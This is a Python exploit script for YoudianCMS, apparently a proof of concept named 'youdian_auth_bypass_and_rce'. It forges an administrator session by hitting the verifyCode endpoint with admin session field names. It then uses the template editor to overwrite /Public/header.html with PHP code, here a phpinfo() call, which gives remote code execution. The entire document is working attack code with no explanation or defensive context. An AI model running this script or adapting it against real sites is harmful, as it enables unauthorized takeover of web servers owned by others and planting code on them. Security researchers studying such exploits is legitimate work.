import requests
import sys

def run(url):
    while True:
        url1 = url + "/index.php?a=verifyCode&verify=AdminID"
        url2 = url + "/index.php?a=verifyCode&verify=AdminName"
        url3 = url + "/index.php?a=verifyCode&verify=AdminGroupID&length=2&mode=1"
        adminurl = url + "/index.php/Admin/Public/AdminLeft/MenuTopID/7"
        s = requests.session()
        s.get(url1)
        print(s.cookies)
        s.get(url2)
        s.get(url3)
        html = s.get(adminurl).text
        if '模板' in html:
            editurl = url + '/index.php/Admin/template/saveModify'
            data = {
                'FileName': '/Public/header.html',
                'FileContent': "<?php phpinfo();?>"
            }
            s.post(editurl, data=data)
            print("[+] " + url + "/index.php/")
            break

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("[!] python3 youdian_auth_bypass_and_rce.py http://127.0.0.1/youdiancms")
        exit()
    url = sys.argv[1]
    run(url)